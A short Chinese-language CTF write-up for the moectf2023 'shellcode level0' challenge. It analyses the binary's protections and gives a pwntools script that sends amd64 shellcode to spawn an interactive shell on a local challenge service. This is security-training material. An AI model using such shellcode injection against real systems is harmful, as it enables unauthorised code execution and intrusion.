---
title: moectf2023 - shellcode level0
date: 2023/9/23 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 使用shellcode利用64位程序漏洞，发送shellcode并获取交互。
---

## 文件分析

下载`shellcode_level0`, NX off, PIE on, Canary on, RELRO full  
ghidra分析为64位程序

## 解题思路

程序中直接执行rbp-0x70的地址，且给了100B的空间，填一个shellcode即可

{% note warning fa-exclamation %}
在运行asm时加上参数`arch='amd64'`，否则缺省以i386架构产生，会报错
{% endnote %}

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 33151)
shc = asm(shellcraft.amd64.sh(), arch='amd64')
sh.sendline(shc)
sh.interactive()
```

Done.
